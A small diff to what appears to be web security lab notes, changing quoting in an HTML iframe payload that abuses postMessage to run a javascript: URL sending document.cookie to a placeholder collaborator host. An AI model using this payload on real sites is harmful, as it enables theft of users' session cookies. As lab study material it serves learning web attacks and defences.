@@ -235,7 +235,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 ```html
 <iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
     "type": "load-channel",
-    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
+    "url": "JavaScript:document.location=`https://COLLABORATOR.com?c=`+document.cookie"
 }), "*");'>
 
 ```  
